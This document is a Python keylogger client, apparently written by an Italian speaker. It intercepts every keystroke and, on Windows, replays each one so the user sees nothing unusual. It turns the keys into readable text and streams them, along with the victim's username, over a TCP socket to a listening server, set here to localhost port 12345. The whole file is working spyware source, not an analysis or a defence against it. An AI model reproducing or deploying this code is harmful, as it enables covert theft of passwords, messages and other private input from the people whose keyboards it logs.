from lib import keyboard
from datetime import datetime
import threading
import getpass
import socket
import platform

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
server_address = ('localhost', 12345)
client_socket.connect(server_address)
client_socket.sendall(str(getpass.getuser()).encode())

evento = threading.Event()
windows=False
if platform.system() == 'Windows':
    windows=True

def recording():
    msg = keyboard.read_event(suppress=True)
    if windows:
        l = list()
        l.append(msg)
        keyboard.play(l)
    return msg

def writeToFileRaw(lPath, lName, l):    
    newLog = open(lPath + lName, "a")
    newLog.write(str(l))
    newLog.close()

def rispondiServer():
    while evento.is_set() == False:
        client_socket.recv(1024)

def writeToFileHuman(strh):
    strh=str(strh)+"\n"
    if strh.find("down") != -1:   
        if strh.find("enter") != -1:
            strh = "\n"
        elif strh.find("maiusc") != -1:
            strh = ""
        elif strh.find("ctrl") != -1:
            strh = " [CTRL] "
        elif strh.find("esc") != -1:
            strh = " [ESC] "
        elif strh.find("stamp") != -1:
            strh = " [STAMP] "
        elif strh.find("backspace") != -1:
            strh = " [BACKSPACE] "
        elif strh.find("bloc maius") != -1:
            strh = " [MAIUSCOLO] "
        elif strh.find("space") != -1:
            strh = " "
        elif strh.find("tab") != -1:
            strh = " [TAB] "
        else:
            strh = strh.removeprefix("KeyboardEvent(")
            strh = strh.removesuffix(" down)\n")
        try:
            thread_write_server = threading.Thread(target=(client_socket.sendall(strh.encode('utf-8'))))
            thread_write_server.start()
        except:
            evento.set()

def main():

    thread_rispondi= threading.Thread(target=rispondiServer)
    thread_rispondi.daemon=True
    thread_rispondi.start()

    while evento.is_set() == False:
        tempLog = recording()

        thread_write_human = threading.Thread(target=writeToFileHuman, args=(tempLog,))
        thread_write_human.start()
        

#########################
if __name__== "__main__":
   main()                
#########################
